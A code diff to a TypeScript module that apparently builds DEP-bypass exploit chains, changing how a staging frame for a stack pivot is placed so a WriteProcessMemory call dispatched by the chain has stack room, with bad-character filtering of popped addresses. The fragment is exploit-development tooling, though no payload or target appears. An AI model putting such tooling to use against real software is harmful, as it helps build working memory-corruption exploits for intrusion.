@@ -110,14 +110,25 @@ export function stagedPops(api: DepApi, writeOffset: number, pivotPops: number):
  * span has to fit the run. The chain pops each of `pops`, relative to that base, and sends it as it is,
  * so every one of those addresses has to be free of the bad chars; they are not the frame's own bytes and
  * need not be writable. One clean address at the head of a long run proves nothing about the rest, which
- * is why this walks the run a dword at a time instead of testing it once. */
+ * is why this walks the run a dword at a time instead of testing it once.
+ *
+ * It walks down from the top. The pivot puts ESP on the frame, so the API the chain dispatches runs with
+ * its stack in this run and pushes its way down from the frame's base: everything below the frame is the
+ * stack that call gets, and everything above it is wasted. Measured on T06, where a frame 0x1FD5 bytes
+ * above the run's start reached WriteProcessMemory with every argument right and faulted inside it on a
+ * `push` once the call had spent that much. The highest base the run allows gives that call the most room
+ * the module has to offer, and `stagingRoom` is what it came to. */
 export function stagingBase(run: { at: number; size: number }, span: number, pops: number[], bad: number[]): number | undefined {
   const clean = (value: number): boolean => [0, 8, 16, 24].every((shift) => bad.indexOf((value >>> shift) & 0xff) < 0);
-  for (let base = Math.ceil(run.at / 4) * 4; base + span <= run.at + run.size; base += 4) {
+  const first = Math.ceil(run.at / 4) * 4;
+  for (let base = Math.floor((run.at + run.size - span) / 4) * 4; base >= first; base -= 4) {
     if (pops.every((offset) => clean(base + offset))) return base;
   }
   return undefined;
 }
+
+/** Writable bytes below a staged frame, which is the stack the call it dispatches has to run on. */
+export const stagingRoom = (run: { at: number; size: number }, base: number): number => base - run.at;
 
 /** What a slot asks the search to leave in a register, for the slots whose value is a number or a dword in
  * memory. A slot whose value is frame arithmetic (the shellcode's address on the stack), one the emitted
